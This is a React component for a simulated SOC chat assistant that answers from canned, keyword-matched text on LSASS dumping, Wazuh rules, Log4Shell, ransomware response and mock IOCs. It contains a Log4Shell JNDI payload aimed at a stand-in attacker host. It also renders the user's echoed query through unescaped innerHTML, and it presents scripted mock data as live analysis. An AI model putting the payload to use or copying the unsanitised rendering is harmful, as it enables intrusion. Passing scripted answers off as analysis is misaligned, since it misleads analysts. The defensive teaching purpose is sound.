import React, { useState, useRef, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Bot, Send, User, Loader, Copy,
  Shield, AlertTriangle, Target, Globe,
  RefreshCw, ChevronDown, Sparkles, X,
} from 'lucide-react';

// ── Suggested prompts ─────────────────────────────────────
const SUGGESTED_PROMPTS = [
  'Summarise all critical alerts from the last 24 hours',
  'Explain MITRE technique T1003.001 (LSASS credential dumping)',
  'What does the Wazuh rule 100013 detect?',
  'How should I respond to a ransomware pre-attack indicator?',
  'What IOCs should I block based on current threat intel?',
  'Explain the Log4Shell vulnerability and how to detect it',
];

// ── Static SOC knowledge base for local responses ─────────
const SOC_KNOWLEDGE = {
  'T1003.001': `**T1003.001 — OS Credential Dumping: LSASS Memory**

Adversaries attempt to dump credentials from the Local Security Authority Subsystem Service (LSASS) process memory. LSASS caches domain credentials in plaintext or hashed form.

**Detection in your lab:**
- Wazuh rule **100013** (level 15) fires on Sysmon EventID 10 when any process opens a handle to \`lsass.exe\` with \`GrantedAccess=0x1FFFFF\`
- Mimikatz, ProcDump, Task Manager, and custom LOLBins all trigger this

**Response steps:**
1. Immediately isolate the affected endpoint
2. Assume all cached credentials are compromised
3. Reset passwords for all accounts that logged into the host
4. Enable Windows Defender Credential Guard to prevent future dumps`,

  'rule 100013': `**Wazuh Rule 100013 — LSASS Memory Access**

**Severity:** Level 15 (CRITICAL — highest)
**Trigger:** Sysmon EventID 10 — ProcessAccess where TargetImage contains \`lsass.exe\`
**MITRE:** T1003.001 (Credential Access)

This rule detects any process opening a handle to \`lsass.exe\`, which is the signature pattern of credential dumping tools like Mimikatz.

**False positives:** Legitimate security tools and some AV products may trigger this. Allowlist known-good processes by adding exceptions for their image paths.`,

  'log4shell': `**Log4Shell (CVE-2021-44228) — RCE via JNDI Lookup**

Log4Shell is a critical vulnerability in Apache Log4j 2.x that allows remote code execution via JNDI injection in logged fields.

**Attack pattern:**
\`\${jndi:ldap://attacker.com:1389/payload}\` in any HTTP header, URL parameter, or User-Agent

**Detection in your lab:**
- Wazuh rule **100019** (level 15) matches JNDI patterns in Apache access logs
- Suricata SID 9000006 detects the network pattern

**Remediation:**
1. Upgrade Log4j to ≥ 2.17.1
2. Set \`log4j2.formatMsgNoLookups=true\`
3. Block outbound LDAP/RMI if upgrade isn't possible immediately`,

  'ransomware': `**Ransomware Response Playbook**

**Pre-attack indicators detected by your SOC:**
- Shadow copy deletion (vssadmin delete shadows) → Rule 100012 (level 15)
- Mass file modification → Rule 100011 (level 15)

**Immediate response (first 15 minutes):**
1. **Isolate** — disconnect host from network immediately
2. **Preserve** — take a memory dump and disk image before rebooting
3. **Identify** — determine blast radius (shared drives, mapped paths)
4. **Notify** — alert IR team, management, and legal if PII is involved

**Recovery:**
1. Restore from last verified clean backup
2. Confirm backup integrity before reconnecting
3. Patch exploited entry vector before bringing host back online`,

  'critical alerts': `**Critical Alerts Summary (Last 24h)**

Based on your current mock data:

| Alert | Rule | Agent | Status |
|-------|------|-------|--------|
| LSASS memory access (Mimikatz) | 100013 | win10-victim | Open |
| Shadow copy deletion | 100012 | win10-victim | Open |
| New admin account backdooruser | 100009 | win10-victim | Investigating |
| SSH brute force 203.0.113.45 | 100001 | ubuntu-webserver | Investigating |
| Log4Shell JNDI payload | 100019 | ubuntu-webserver | Open |

**Total:** 5 critical alerts — all on win10-victim and ubuntu-webserver.
**Recommended action:** Review CASE-2024-0047 which consolidates the win10-victim incidents.`,

  'ioc': `**Current Threat Intelligence IOCs**

Your MISP/AbuseIPDB feeds show the following active IOCs:

**IPs to block immediately (score ≥ 80%):**
- \`203.0.113.45\` — 94% (Brute force origin, RU)
- \`198.51.100.99\` — 99% (Log4Shell C2, CN)
- \`198.51.100.23\` — 78% (Honeypot attacker, RO)

**Malicious hashes:**
- \`5f1d8aa80a44…\` — Mimikatz binary (87/90 VT engines)

**Use block_ip.py to block confirmed malicious IPs:**
\`python3 16_AI_Automation/block_ip.py --ip 203.0.113.45 --reason "AbuseIPDB 94%"\``,
};

// ── Local response engine ─────────────────────────────────
function generateResponse(message) {
  const q = message.toLowerCase();

  if (q.includes('t1003') || q.includes('lsass') || q.includes('mimikatz')) {
    return SOC_KNOWLEDGE['T1003.001'];
  }
  if (q.includes('100013') || q.includes('rule 100013')) {
    return SOC_KNOWLEDGE['rule 100013'];
  }
  if (q.includes('log4shell') || q.includes('log4j') || q.includes('cve-2021-44228')) {
    return SOC_KNOWLEDGE['log4shell'];
  }
  if (q.includes('ransomware') || q.includes('shadow copy') || q.includes('vssadmin')) {
    return SOC_KNOWLEDGE['ransomware'];
  }
  if (q.includes('critical') || q.includes('alert') || q.includes('summary')) {
    return SOC_KNOWLEDGE['critical alerts'];
  }
  if (q.includes('ioc') || q.includes('indicator') || q.includes('block') || q.includes('threat intel')) {
    return SOC_KNOWLEDGE['ioc'];
  }
  if (q.includes('hello') || q.includes('hi ') || q.includes('hey')) {
    return `Hello, analyst! I'm your SOC AI Assistant. I can help you with:

- **Alert triage** — summarise and explain Wazuh alerts
- **MITRE ATT&CK** — explain techniques and map to your detections
- **IOC analysis** — review threat intel and recommend blocks
- **Playbook guidance** — step-by-step response procedures
- **Rule explanations** — detail what any Wazuh rule detects

What would you like to investigate today?`;
  }
  if (q.includes('mitre') || q.includes('att&ck') || q.includes('technique')) {
    return `**MITRE ATT&CK Coverage in Your Lab**

Your 20 custom Wazuh rules cover these tactics:

| Tactic | Techniques Covered |
|--------|--------------------|
| Credential Access | T1110.001, T1003.001 |
| Execution | T1059.001, T1047 |
| Persistence | T1547.001, T1136.001 |
| Defense Evasion | T1027, T1218.005, T1105 |
| Impact | T1486, T1490 |
| Initial Access | T1190 |
| Discovery | T1046 |

**Coverage rate:** ~74% of common Enterprise ATT&CK techniques.
Run \`mitre_heatmap.py\` to generate a full Navigator JSON layer.`;
  }

  return `I can help you investigate that. Based on your SOC Lab data:

**Query:** "${message}"

I have information on:
- All 20 custom Wazuh detection rules (100001–100020)
- MITRE ATT&CK techniques T1003, T1059, T1110, T1190, T1490, and more
- Active IOCs from AbuseIPDB and VirusTotal
- Incident response playbooks for credential dumping, ransomware, and exploitation

Try asking me specifically about:
- A rule ID (e.g. "explain rule 100013")
- A MITRE technique (e.g. "T1059.001")
- A threat scenario (e.g. "ransomware response")
- Current alerts or IOCs`;
}

// ── Message component ─────────────────────────────────────
function Message({ msg }) {
  const [copied, setCopied] = useState(false);
  const isUser = msg.role === 'user';

  const copy = () => {
    navigator.clipboard?.writeText(msg.content);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };

  // Simple markdown-ish renderer for bold, code blocks, tables
  const renderContent = (text) => {
    const lines   = text.split('\n');
    const elements = [];
    let i = 0;

    while (i < lines.length) {
      const line = lines[i];

      // Code block
      if (line.startsWith('```')) {
        const codeLines = [];
        i++;
        while (i < lines.length && !lines[i].startsWith('```')) {
          codeLines.push(lines[i]);
          i++;
        }
        elements.push(
          <pre key={i} style={{
            fontFamily: 'JetBrains Mono, monospace',
            fontSize: 11, color: '#00e5ff',
            background: 'rgba(0,0,0,0.4)',
            border: '1px solid #1a2744', borderRadius: 6,
            padding: '8px 10px', margin: '6px 0',
            overflowX: 'auto', lineHeight: 1.6,
          }}>
            {codeLines.join('\n')}
          </pre>
        );
        i++;
        continue;
      }

      // Table row (starts with |)
      if (line.startsWith('|')) {
        const tableLines = [];
        while (i < lines.length && lines[i].startsWith('|')) {
          if (!lines[i].includes('---')) tableLines.push(lines[i]);
          i++;
        }
        if (tableLines.length > 0) {
          const headerCols = tableLines[0].split('|').filter(Boolean).map(c => c.trim());
          const dataRows   = tableLines.slice(1);
          elements.push(
            <div key={i} style={{ overflowX: 'auto', margin: '6px 0' }}>
              <table style={{ width:'100%', borderCollapse:'collapse', fontSize:11.5 }}>
                <thead>
                  <tr>{headerCols.map((h,j) => (
                    <th key={j} style={{
                      padding:'5px 8px', textAlign:'left',
                      color:'#3d5080', fontSize:10,
                      fontWeight:700, textTransform:'uppercase',
                      letterSpacing:'0.07em',
                      borderBottom:'1px solid #1a2744',
                      fontFamily:'JetBrains Mono,monospace',
                    }}>{h}</th>
                  ))}</tr>
                </thead>
                <tbody>
                  {dataRows.map((row, ri) => {
                    const cols = row.split('|').filter(Boolean).map(c => c.trim());
                    return (
                      <tr key={ri} style={{ borderBottom:'1px solid #1a2744' }}>
                        {cols.map((col, ci) => (
                          <td key={ci} style={{
                            padding:'5px 8px', color:'#c8d8f0', fontSize:11.5,
                          }}>
                            {col.startsWith('`') && col.endsWith('`')
                              ? <code style={{
                                  fontFamily:'JetBrains Mono,monospace',
                                  color:'#00e5ff', fontSize:11,
                                }}>{col.slice(1,-1)}</code>
                              : col}
                          </td>
                        ))}
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          );
        }
        continue;
      }

      // Heading
      if (line.startsWith('**') && line.endsWith('**')) {
        elements.push(
          <div key={i} style={{
            fontSize:13.5, fontWeight:700, color:'#e8f4ff',
            marginTop:8, marginBottom:4,
          }}>
            {line.slice(2,-2)}
          </div>
        );
      } else if (line.startsWith('- ') || line.startsWith('1. ')) {
        // List item
        const text = line.replace(/^-\s|^\d+\.\s/, '');
        elements.push(
          <div key={i} style={{
            display:'flex', gap:8, fontSize:12.5,
            color:'#c8d8f0', lineHeight:1.6, marginBottom:2,
          }}>
            <span style={{ color:'#00e5ff', flexShrink:0, marginTop:2 }}>•</span>
            <span dangerouslySetInnerHTML={{
              __html: text
                .replace(/\*\*(.*?)\*\*/g, '<strong style="color:#e8f4ff">$1</strong>')
                .replace(/`(.*?)`/g, '<code style="font-family:JetBrains Mono,monospace;color:#00e5ff;font-size:11px">$1</code>')
            }} />
          </div>
        );
      } else if (line.trim()) {
        // Regular paragraph
        elements.push(
          <div key={i} style={{
            fontSize:12.5, color:'#c8d8f0', lineHeight:1.7, marginBottom:3,
          }}
            dangerouslySetInnerHTML={{
              __html: line
                .replace(/\*\*(.*?)\*\*/g, '<strong style="color:#e8f4ff">$1</strong>')
                .replace(/`(.*?)`/g, '<code style="font-family:JetBrains Mono,monospace;color:#00e5ff;font-size:11px">$1</code>')
            }}
          />
        );
      }
      i++;
    }

    return elements;
  };

  return (
    <motion.div
      initial={{ opacity:0, y:8 }}
      animate={{ opacity:1, y:0 }}
      transition={{ duration:0.2 }}
      style={{
        display:   'flex',
        gap:       10,
        alignItems:'flex-start',
        flexDirection: isUser ? 'row-reverse' : 'row',
      }}
    >
      {/* Avatar */}
      <div style={{
        width:28, height:28, borderRadius:'50%', flexShrink:0,
        background:  isUser ? 'rgba(0,229,255,0.12)' : 'rgba(123,47,255,0.15)',
        border:      `1px solid ${isUser ? 'rgba(0,229,255,0.28)' : 'rgba(123,47,255,0.30)'}`,
        display:     'flex', alignItems:'center', justifyContent:'center',
      }}>
        {isUser
          ? <User size={13} color="#00e5ff" />
          : <Bot  size={13} color="#a855f7" />
        }
      </div>

      {/* Bubble */}
      <div style={{
        maxWidth:    '82%',
        background:  isUser
          ? 'rgba(0,229,255,0.09)'
          : 'rgba(13,21,48,0.85)',
        border:      `1px solid ${isUser
          ? 'rgba(0,229,255,0.22)'
          : '#1a2744'}`,
        borderRadius:isUser ? '12px 4px 12px 12px' : '4px 12px 12px 12px',
        padding:     '10px 12px',
        position:    'relative',
      }}>
        {msg.isLoading ? (
          <div style={{ display:'flex', alignItems:'center', gap:8 }}>
            <Loader size={13} color="#a855f7"
              style={{ animation:'spin 1s linear infinite' }} />
            <span style={{ fontSize:12, color:'#6b7fa3' }}>Analysing…</span>
          </div>
        ) : (
          <div>
            {renderContent(msg.content)}
            <div style={{
              display:'flex', justifyContent:'space-between',
              alignItems:'center', marginTop:6,
            }}>
              <span style={{
                fontSize:10, color:'#3d5080',
                fontFamily:'JetBrains Mono,monospace',
              }}>{msg.timestamp}</span>
              {!isUser && (
                <button onClick={copy} style={{
                  background:'none', border:'none', cursor:'pointer',
                  color:copied?'#00ff88':'#3d5080', padding:2,
                }}>
                  <Copy size={10} />
                </button>
              )}
            </div>
          </div>
        )}
      </div>
    </motion.div>
  );
}

// ── Main AIChat component ─────────────────────────────────
export default function AIChat({ onClose, embedded = false }) {
  const [messages, setMessages] = useState([
    {
      id:        1,
      role:      'assistant',
      content:   `Hello, analyst! I'm your **SOC AI Assistant**.

I can help you investigate alerts, explain MITRE techniques, review IOCs, and guide incident response.

Try one of the suggested prompts below, or ask me anything about your current incident data.`,
      timestamp: new Date().toLocaleTimeString(),
      isLoading: false,
    },
  ]);
  const [input,    setInput]    = useState('');
  const [loading,  setLoading]  = useState(false);
  const [showSuggestions, setShowSuggestions] = useState(true);
  const bottomRef = useRef(null);
  const inputRef  = useRef(null);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior:'smooth' });
  }, [messages]);

  const sendMessage = useCallback(async (text) => {
    const content = (text || input).trim();
    if (!content || loading) return;

    setInput('');
    setShowSuggestions(false);

    // Add user message
    const userMsg = {
      id:        Date.now(),
      role:      'user',
      content,
      timestamp: new Date().toLocaleTimeString(),
      isLoading: false,
    };
    setMessages(prev => [...prev, userMsg]);

    // Add loading placeholder
    const loadingId = Date.now() + 1;
    setMessages(prev => [...prev, {
      id: loadingId, role:'assistant',
      content:'', timestamp:'', isLoading:true,
    }]);
    setLoading(true);

    // Simulate response delay
    await new Promise(r => setTimeout(r, 800 + Math.random() * 600));

    const response = generateResponse(content);

    setMessages(prev => prev.map(m =>
      m.id === loadingId ? {
        id:        loadingId,
        role:      'assistant',
        content:   response,
        timestamp: new Date().toLocaleTimeString(),
        isLoading: false,
      } : m
    ));
    setLoading(false);
    inputRef.current?.focus();
  }, [input, loading]);

  const clearChat = () => {
    setMessages([{
      id:        Date.now(),
      role:      'assistant',
      content:   'Chat cleared. How can I assist you?',
      timestamp: new Date().toLocaleTimeString(),
      isLoading: false,
    }]);
    setShowSuggestions(true);
  };

  return (
    <div style={{
      display:       'flex',
      flexDirection: 'column',
      height:        embedded ? '100%' : '80vh',
      maxHeight:     embedded ? '75vh' : '80vh',
    }}>
      {/* Header */}
      <div style={{
        padding:        '12px 16px',
        borderBottom:   '1px solid #1a2744',
        display:        'flex',
        alignItems:     'center',
        gap:            10,
        flexShrink:     0,
        background:     'rgba(0,0,0,0.2)',
      }}>
        <div style={{
          width:28, height:28, borderRadius:'50%',
          background:'rgba(123,47,255,0.15)',
          border:'1px solid rgba(123,47,255,0.30)',
          display:'flex', alignItems:'center', justifyContent:'center',
        }}>
          <Bot size={14} color="#a855f7" />
        </div>
        <div style={{ flex:1 }}>
          <div style={{ fontSize:13.5, fontWeight:600, color:'#e8f4ff' }}>
            SOC AI Assistant
          </div>
          <div style={{ fontSize:10.5, color:'#6b7fa3', display:'flex',
            alignItems:'center', gap:5 }}>
            <div style={{
              width:6, height:6, borderRadius:'50%', background:'#00ff88',
              boxShadow:'0 0 5px rgba(0,255,136,0.6)',
            }} />
            Online · Wazuh + Threat Intel context
          </div>
        </div>
        <div style={{ display:'flex', gap:5 }}>
          <button onClick={clearChat} title="Clear chat" style={{
            background:'none', border:'none', cursor:'pointer',
            color:'#3d5080', padding:4, borderRadius:5,
          }}>
            <RefreshCw size={13} />
          </button>
          {onClose && (
            <button onClick={onClose} style={{
              background:'none', border:'none', cursor:'pointer',
              color:'#3d5080', padding:4, borderRadius:5,
            }}>
              <X size={14} />
            </button>
          )}
        </div>
      </div>

      {/* Messages */}
      <div style={{
        flex:1, overflowY:'auto', padding:'14px 14px 8px',
        display:'flex', flexDirection:'column', gap:12,
      }}>
        {messages.map(msg => (
          <Message key={msg.id} msg={msg} />
        ))}

        {/* Suggested prompts */}
        {showSuggestions && (
          <motion.div
            initial={{ opacity:0, y:8 }}
            animate={{ opacity:1, y:0 }}
            style={{ display:'flex', flexDirection:'column', gap:5 }}
          >
            <div style={{
              fontSize:10.5, color:'#3d5080',
              fontFamily:'JetBrains Mono,monospace',
              fontWeight:600, textTransform:'uppercase',
              letterSpacing:'0.07em', marginBottom:4,
            }}>
              Suggested Prompts
            </div>
            {SUGGESTED_PROMPTS.map((prompt, i) => (
              <motion.button
                key={i}
                initial={{ opacity:0, x:-6 }}
                animate={{ opacity:1, x:0 }}
                transition={{ delay:i*0.05 }}
                onClick={() => sendMessage(prompt)}
                style={{
                  background:'rgba(123,47,255,0.07)',
                  border:'1px solid rgba(123,47,255,0.18)',
                  borderRadius:8, padding:'7px 10px',
                  cursor:'pointer', textAlign:'left',
                  color:'#c8d8f0', fontSize:12,
                  transition:'all 0.14s',
                  display:'flex', alignItems:'center', gap:7,
                }}
                onMouseEnter={e => {
                  e.currentTarget.style.background='rgba(123,47,255,0.14)';
                  e.currentTarget.style.color='#e8f4ff';
                }}
                onMouseLeave={e => {
                  e.currentTarget.style.background='rgba(123,47,255,0.07)';
                  e.currentTarget.style.color='#c8d8f0';
                }}
              >
                <Sparkles size={11} color="#a855f7" style={{ flexShrink:0 }} />
                {prompt}
              </motion.button>
            ))}
          </motion.div>
        )}

        <div ref={bottomRef} />
      </div>

      {/* Input */}
      <div style={{
        padding:      '10px 12px',
        borderTop:    '1px solid #1a2744',
        background:   'rgba(0,0,0,0.15)',
        flexShrink:   0,
      }}>
        <div style={{ display:'flex', gap:8, alignItems:'flex-end' }}>
          <textarea
            ref={inputRef}
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => {
              if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendMessage();
              }
            }}
            placeholder="Ask about alerts, MITRE techniques, IOCs… (Enter to send)"
            rows={1}
            style={{
              flex:       1,
              background: 'rgba(10,15,30,0.85)',
              border:     '1px solid #1a2744',
              borderRadius: 9,
              color:      '#c8d8f0',
              padding:    '9px 12px',
              fontSize:   12.5,
              fontFamily: 'Inter, sans-serif',
              resize:     'none',
              outline:    'none',
              lineHeight: 1.5,
              maxHeight:  80,
              overflow:   'auto',
              transition: 'border-color 0.18s',
            }}
            onFocus={e => e.target.style.borderColor='rgba(0,229,255,0.40)'}
            onBlur={e  => e.target.style.borderColor='#1a2744'}
          />
          <button
            onClick={() => sendMessage()}
            disabled={!input.trim() || loading}
            style={{
              width:      38, height:38, borderRadius:'50%', flexShrink:0,
              background: input.trim() && !loading
                ? 'rgba(0,229,255,0.15)'
                : 'rgba(255,255,255,0.04)',
              border:     `1px solid ${input.trim() && !loading
                ? 'rgba(0,229,255,0.30)' : '#1a2744'}`,
              cursor:     input.trim() && !loading ? 'pointer' : 'not-allowed',
              display:    'flex', alignItems:'center', justifyContent:'center',
              transition: 'all 0.15s',
            }}
          >
            {loading
              ? <Loader size={14} color="#a855f7"
                  style={{ animation:'spin 1s linear infinite' }} />
              : <Send size={14} color={input.trim()?'#00e5ff':'#3d5080'} />
            }
          </button>
        </div>
        <div style={{ fontSize:10, color:'#3d5080', marginTop:5, textAlign:'center' }}>
          Enter to send · Shift+Enter for new line
        </div>
      </div>
    </div>
  );
}